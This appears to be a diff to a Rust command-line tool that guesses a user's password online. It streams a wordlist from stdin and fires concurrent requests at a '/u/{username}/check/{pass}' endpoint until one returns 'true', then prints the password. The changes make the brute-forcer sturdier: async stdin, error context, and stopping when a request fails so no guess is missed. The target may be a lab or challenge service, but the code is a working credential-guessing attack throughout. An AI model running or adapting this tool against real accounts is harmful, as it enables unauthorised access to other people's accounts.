@@ -1,13 +1,11 @@
-use std::{
-    io::{self, BufRead},
-    process,
-};
+use std::{pin::pin, process};
 
-use anyhow::{Result, anyhow, ensure};
+use anyhow::{Context, Result, anyhow, ensure};
 use clap::Parser;
 use futures::{StreamExt, stream};
 use indicatif::{ProgressBar, ProgressStyle};
 use reqwest::ClientBuilder;
+use tokio::io::{AsyncBufReadExt, BufReader};
 use tracing::debug;
 use url::Url;
 
@@ -49,21 +47,42 @@ async fn main() -> Result<()> {
 
     // Read stdin line by line and let buffer_unordered pull lines on demand, so
     // at most CONCURRENCY passwords are resident no matter how large the file is.
-    let lines = io::stdin().lock().lines();
+    // Tokio's stdin hands the blocking reads to its blocking pool, so a slow
+    // pipe never stalls a worker that is driving requests.
+    let lines = stream::unfold(
+        BufReader::new(tokio::io::stdin()).lines(),
+        |mut lines| async {
+            lines
+                .next_line()
+                .await
+                .transpose()
+                .map(|line| (line, lines))
+        },
+    );
 
-    let bodies = stream::iter(lines)
+    let bodies = lines
         .map(|line| {
             let client = &client;
             let hostname = cli.hostname.clone();
             let username = cli.username.clone();
             async move {
-                let pass = line?;
+                let pass = line.context("reading passwords from stdin")?;
                 let url = format!("{hostname}u/{username}/check/{pass}");
-                let resp = client.get(url).send().await?;
-                ensure!(resp.status().is_success(), "Bad http request");
-                let text = resp.text().await?;
-                let result: Result<(String, String)> = Ok((pass, text));
-                result
+                let resp = client
+                    .get(url)
+                    .send()
+                    .await
+                    .with_context(|| format!("checking {pass:?}"))?;
+                let status = resp.status();
+                ensure!(
+                    status.is_success(),
+                    "checking {pass:?}: server answered {status}"
+                );
+                let text = resp
+                    .text()
+                    .await
+                    .with_context(|| format!("checking {pass:?}"))?;
+                anyhow::Ok((pass, text))
             }
         })
         .buffer_unordered(CONCURRENCY);
@@ -71,21 +90,20 @@ async fn main() -> Result<()> {
     // Take every response that has already arrived rather than one per
     // wakeup: under load the batches grow, so the progress update and the
     // scan for `true` cost once per batch instead of once per password.
-    let mut batches = bodies.ready_chunks(CONCURRENCY);
+    let mut batches = pin!(bodies.ready_chunks(CONCURRENCY));
     while let Some(batch) = batches.next().await {
         pb.inc(batch.len() as u64);
-        for b in batch {
-            match b {
-                Ok((pass, body)) if body == "true" => {
-                    pb.finish_and_clear();
-                    println!("Password is: {pass}");
-                    process::exit(0);
-                }
-                Ok((pass, body)) => {
-                    debug!("{pass}: {body}");
-                }
-                _ => {}
+        for result in batch {
+            // A guess that never got an answer might have been the password,
+            // so carrying on could end in a false "didn't find it". Stop and
+            // say why instead.
+            let (pass, body) = result.inspect_err(|_| pb.finish_and_clear())?;
+            if body == "true" {
+                pb.finish_and_clear();
+                println!("Password is: {pass}");
+                process::exit(0);
             }
+            debug!("{pass}: {body}");
         }
     }
 
